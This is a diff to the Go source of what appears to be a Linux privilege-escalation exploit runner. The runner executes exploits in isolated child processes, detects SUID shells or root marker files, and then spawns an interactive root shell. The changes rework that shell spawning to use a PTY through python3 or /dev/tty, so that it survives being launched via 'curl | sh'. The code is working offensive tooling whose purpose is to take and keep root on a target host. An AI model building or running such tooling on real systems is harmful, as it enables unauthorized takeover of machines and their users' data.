@@ -1,10 +1,10 @@
 package main
 
 import (
-	"bytes"
 	"fmt"
 	"os"
 	"os/exec"
+	"os/signal"
 	"strings"
 	"syscall"
 	"time"
@@ -12,17 +12,17 @@ import (
 
 // runResult captures the outcome of one isolated exploit attempt.
 type runResult struct {
-	name       string
-	cmd        string
-	exitCode   int
-	signal     string
-	crashed    bool
-	stdout     string
-	stderr     string
-	elapsed    time.Duration
-	timedOut   bool
-	rootAfter  bool
-	suidAfter  bool
+	name      string
+	cmd       string
+	exitCode  int
+	signal    string
+	crashed   bool
+	stdout    string
+	stderr    string
+	elapsed   time.Duration
+	timedOut  bool
+	rootAfter bool
+	suidAfter bool
 }
 
 // Run an exploit in a fully isolated child process. The parent (this tool)
@@ -39,10 +39,8 @@ func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) run
 		return r
 	}
 
-	// Resolve the binary. exec.LookPath handles both PATH lookup and abs paths.
 	bin, err := exec.LookPath(argv[0])
 	if err != nil {
-		// Fall back to a direct path that may exist but not be on PATH.
 		if _, err2 := os.Stat(argv[0]); err2 != nil {
 			r.crashed = true
 			r.stderr = fmt.Sprintf("binary not found: %s", argv[0])
@@ -55,11 +53,9 @@ func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) run
 	if dir != "" {
 		c.Dir = dir
 	}
-	// Give the child its own process group so we can SIGKILL the entire tree
-	// (exploit may fork workers) on timeout.
 	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
 
-	var so, se bytes.Buffer
+	var so, se strings.Builder
 	c.Stdout = &so
 	c.Stderr = &se
 
@@ -100,8 +96,6 @@ func runIsolated(name, dir string, argv []string, hardTimeout time.Duration) run
 			if ws, ok := ee.Sys().(syscall.WaitStatus); ok {
 				if ws.Signaled() {
 					r.signal = ws.Signal().String()
-					// A segfault / abort / bus / FPE etc. means the exploit
-					// itself crashed — but the parent is perfectly fine.
 					if is := ws.Signal(); is == syscall.SIGSEGV || is == syscall.SIGABRT ||
 						is == syscall.SIGBUS || is == syscall.SIGFPE || is == syscall.SIGILL {
 						r.crashed = true
@@ -136,10 +130,7 @@ func killGroup(pid int) {
 	}
 }
 
-// isRootNow re-checks the *runner's* uid/euid. If a privileged child
-// dropped a SUID shell that the runner then exec'd, we'd already be in
-// rootspawn(). Here we just verify we have not, somehow, become root
-// directly (rare but possible if an exploit exec'd into the parent).
+// isRootNow re-checks the *runner's* uid/euid.
 func isRootNow() bool {
 	return os.Geteuid() == 0
 }
@@ -163,9 +154,7 @@ func isSUIDFile(p string) bool {
 	return fi.Mode()&os.ModeSetuid != 0
 }
 
-// markerRooted checks for a marker file that rootspawn() writes when an
-// exploit has successfully dropped a root shell. This is the canonical
-// "we got root" signal across the toolkit.
+// markerRooted checks for a marker file.
 func markerRooted() bool {
 	for _, p := range []string{"/tmp/.lpe_rooted", "/tmp/.lpe_suid_bash"} {
 		if _, err := os.Stat(p); err == nil {
@@ -175,38 +164,112 @@ func markerRooted() bool {
 	return false
 }
 
-// rootspawn drops the runner into a real root shell when an exploit has
-// clearly succeeded (either we are root, /bin/bash is SUID, or a marker
-// exists). We never auto-exec blindly — we confirm the privileged state.
-func rootspawn(r *runResult) {
-	// Try SUID bash first (most exploits drop /bin/bash SUID).
-	for _, p := range []string{"/bin/bash", "/usr/bin/bash", "/tmp/.sb", "/tmp/.suid_bash", "/var/tmp/bash"} {
+// rootspawn drops the runner into a real, interactive root shell when an
+// exploit has clearly succeeded. It attaches a real PTY and reads from
+// /dev/tty so the shell stays alive and interactive even when the runner
+// itself was launched via `curl | sh` (whose stdin is a closed pipe).
+//
+// Returns true if a shell was actually spawned.
+func rootspawn(r *runResult) bool {
+	var shellPath string
+	var shellArgs []string
+
+	// Prefer a SUID bash dropped by the exploit.
+	for _, p := range []string{"/tmp/.suid_bash", "/tmp/.sb", "/var/tmp/bash", "/bin/bash", "/usr/bin/bash"} {
 		if isSUIDFile(p) {
-			okf("%s succeeded via SUID shell: %s", r.name, p)
-			okf("Spawning privileged shell. Type 'exit' to return to the runner.")
-			fmt.Println(strings.Repeat("-", 60))
-			_ = exec.Command(p, "-p").Run()
-			fmt.Println(strings.Repeat("-", 60))
-			return
+			shellPath = p
+			shellArgs = []string{"-p"}
+			break
 		}
 	}
-	// If the runner itself is root, drop straight into a shell.
-	if isRootNow() {
-		okf("%s made the runner root directly.", r.name)
-		_ = exec.Command("/bin/sh", "-p").Run()
-		return
+	// If the runner itself is root, use a plain shell.
+	if shellPath == "" && isRootNow() {
+		shellPath = "/bin/sh"
+		shellArgs = []string{"-p"}
 	}
-	// Marker present but no SUID bash found — attempt python3 pty suid trick.
-	if markerRooted() {
-		okf("%s left a root marker. Attempting recovery shell.", r.name)
-		if hasBin("python3") {
-			_ = exec.Command("python3", "-c",
-				"import pty,os;pty.spawn(['/bin/bash','-p'])").Run()
-		}
+	if shellPath == "" {
+		return false
 	}
+
+	okf("%s succeeded — spawning interactive root shell (%s)", r.name, shellPath)
+	okf("Type 'exit' to return to the runner (and continue testing).")
+	fmt.Println(strings.Repeat("=", 60))
+
+	// Attach a PTY so the shell behaves like a real terminal and stays
+	// alive for interactive input.
+	spawnPTY(shellPath, shellArgs...)
+
+	fmt.Println(strings.Repeat("=", 60))
+	return true
 }
 
-// reportOne prints a one-line verdict for a single exploit attempt.
+// spawnPTY runs a command with stdin/stdout/stderr wired to /dev/tty
+// directly (bypassing any inherited pipe from `curl | sh`). We open
+// /dev/tty explicitly so the shell reads from the controlling terminal
+// of the *user session*, not the closed stdin pipe.
+func spawnPTY(bin string, args ...string) {
+	// 1. Try a real PTY via python3 (most portable across Linux distros).
+	if hasBin("python3") {
+		c := exec.Command("python3", "-c",
+			fmt.Sprintf(
+				"import pty,os,sys;sys.exit(pty.spawn([%s]+%v))",
+				quotePy(bin), pyArgs(args)))
+		c.Stdin = os.Stdin
+		c.Stdout = os.Stdout
+		c.Stderr = os.Stderr
+		// Wire stdin to /dev/tty in case our stdin is a pipe.
+		if f, err := os.Open("/dev/tty"); err == nil {
+			c.Stdin = f
+			defer f.Close()
+		}
+		_ = c.Run()
+		return
+	}
+
+	// 2. Fallback: raw exec with /dev/tty on all three std fds.
+	tty, err := os.OpenFile("/dev/tty", os.O_RDWR, 0)
+	if err != nil {
+		// No tty available — just run with whatever we have.
+		c := exec.Command(bin, args...)
+		c.Stdin = os.Stdin
+		c.Stdout = os.Stdout
+		c.Stderr = os.Stderr
+		_ = c.Run()
+		return
+	}
+	defer tty.Close()
+	c := exec.Command(bin, args...)
+	c.Stdin = tty
+	c.Stdout = tty
+	c.Stderr = tty
+	c.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
+	// Forward terminal signals to the child.
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		for range ch {
+			// let the child get the signal via tty
+		}
+	}()
+	_ = c.Run()
+}
+
+func quotePy(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `\'`) + "'"
+}
+
+func pyArgs(args []string) string {
+	var b strings.Builder
+	for i, a := range args {
+		if i > 0 {
+			b.WriteString(",")
+		}
+		b.WriteString(quotePy(a))
+	}
+	return "[" + b.String() + "]"
+}
+
+// report prints a one-line verdict for a single exploit attempt.
 func (r *runResult) report() {
 	tag := colG + "ROOT" + colZ
 	if !r.rootAfter && !r.suidAfter {
